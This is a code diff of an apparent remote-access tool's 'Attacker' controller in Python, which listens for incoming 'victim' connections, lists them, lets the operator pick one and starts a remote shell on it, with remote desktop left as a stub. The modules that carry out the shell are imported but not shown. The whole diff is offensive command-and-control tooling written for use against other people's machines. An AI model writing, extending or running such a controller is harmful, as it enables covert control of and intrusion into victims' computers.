@@ -5,6 +5,9 @@ import sys
 import threading
 import tkinter as tk
 
+import inquirer
+
+from src.modlues.CLI.commmad_executer import CommandExecuter
 from src.modlues.protocols.victim_dataclass import VictimData
 from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide
 
@@ -22,18 +25,21 @@ class Attacker:
 
         self.chosen_client = None
 
-        self.commands = {"showclients" : self.__show_connected_clients,
+        self.commands = {"showclients": self.__show_connected_clients,
                          "choose": self.__choose_client,
                          "rsh": self.__start_remote_shell,
                          "rdp": self.__start_remote_desktop
                          }
+
+        self.command_executer = CommandExecuter(self.commands)
+
     def main(self):
+        threading.Thread(target=self.__start_listing).start()
         threading.Thread(target=self.__admin_input).start()
-        self.__start_listing()
 
     def __start_listing(self):
-        self.server.listen()
         print(f'LISTENING... ({self.IP}:{self.PORT})')
+        self.server.listen()
         try:
             while True:
                 conn, addr = self.server.accept()
@@ -48,16 +54,17 @@ class Attacker:
 
     def __admin_input(self):
         while True:
-            raw_command = input("attacker % ",)
-            command_components = raw_command.split(' ')
-            command = command_components[0]
-            command_args = command_components[1:]
+            if self.chosen_client:
+                input_text = f"attacker {self.chosen_client.addr} $ "
+            else:
+                input_text = f"attacker $ "
 
-            func = self.commands.get(raw_command)
-            if func:
-                func()
+            command = input(input_text)
+
+            self.command_executer.exec(command)
 
     def __show_connected_clients(self):
+        print("Connected Victims - ")
         print('-' * 20)
         for i, client in enumerate(self.connected_clients, start=1):
             print(f'{i}. {client.addr}')
@@ -66,12 +73,20 @@ class Attacker:
     def __choose_client(self):
         self.__show_connected_clients()
         victim_id = int(input("Enter Victim Id: "))
-        if self.connected_clients[victim_id-1]:
-            self.chosen_client = self.connected_clients[victim_id-1]
+        if self.connected_clients[victim_id - 1]:
+            self.chosen_client = self.connected_clients[victim_id - 1]
+            
+        conn_type = int(input("what type of connection?\n1. RemoteShell\n2. RemoteDesktop"))
 
-
-    def __start_remote_desktop(self):
-        RemoteShellAttackerSide(self.chosen_client.conn).main()
+        if conn_type == 1:
+            self.__start_remote_shell()
+        elif conn_type == 2:
+            self.__start_remote_desktop()
+        else:
+            print("Invalid Input")
 
     def __start_remote_shell(self):
-        pass
+        RemoteShellAttackerSide(self.chosen_client.conn).main()
+
+    def __start_remote_desktop(self):
+        print("feature in development! :(")
